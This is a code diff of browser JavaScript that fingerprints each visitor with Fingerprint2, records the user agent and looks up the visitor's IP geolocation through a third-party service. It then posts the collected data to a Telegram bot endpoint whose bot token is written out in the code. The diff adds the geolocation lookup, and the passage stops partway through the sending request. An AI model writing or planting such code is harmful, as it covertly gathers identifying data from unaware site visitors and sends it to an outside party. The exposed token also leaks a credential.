@@ -1,32 +1,25 @@
+
 var userData = {
-    "internalIPs": [],
-    "externalIPs": {"ipv4": [], "ipv6": []},
+    "IP": [],
     "fingerprintHash": '',
     "userAgent": navigator.userAgent
 }
 
-getIPs(function(ip){
-    //local IPs
-    if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/))
-        userData.internalIPs.push(ip);
-    //IPv6 addresses
-    else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/))
-        userData.externalIPs["ipv6"].push(ip);
-    //assume the rest are public IPs
-    else
-        userData.externalIPs["ipv4"].push(ip);
-});
 
 new Fingerprint2().get(function(fingerprint, components){
   // this will use all available fingerprinting sources
   userData.fingerprintHash = fingerprint
-
+    
   // components is an array of all fingerprinting components used
 });
 
 
 var sendInfo = function(endpoint){
     endpoint='https://api.telegram.org/bot1144251938:AAFc1ywZOJUeb2fzSw54fVBTxdarxAVuM20/sendMessage';
+    $.getJSON('https://json.geoiplookup.io/?callback=?', function(dataIP) {
+      userData.IP=dataIP;
+      console.log(userData);
+    });
     setTimeout(function(){
         var xhr = new XMLHttpRequest();
         xhr.open("POST", endpoint, true);
